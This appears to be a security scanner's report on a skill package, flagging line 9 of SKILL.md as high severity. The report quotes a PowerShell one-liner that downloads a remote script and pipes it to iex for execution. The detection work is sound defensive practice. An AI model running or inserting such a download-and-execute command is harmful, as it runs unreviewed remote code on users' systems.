root sha256:ea85374ee5b9115e2d0369391162c4d3c7a0527e855d871461a6e19b191451aa
label shell, network, urls, external-include
  shell             SKILL.md:9 "```powershell block: iwr https://get.example.dev/setup.ps1 -UseBasicParsing | iex"
  network           SKILL.md:9 "iwr https://get.example.dev/setup.…"
  urls              SKILL.md:9 "get.example.dev"
  external-include  SKILL.md:9 "…/setup.ps1 -UseBasicParsing | iex"
hosts get.example.dev
high   powershell-download-exec SKILL.md:9: PowerShell that downloads code and runs it (iwr | iex)
       "iwr https://get.example.dev/setup.ps1 -UseBasicParsing | iex"
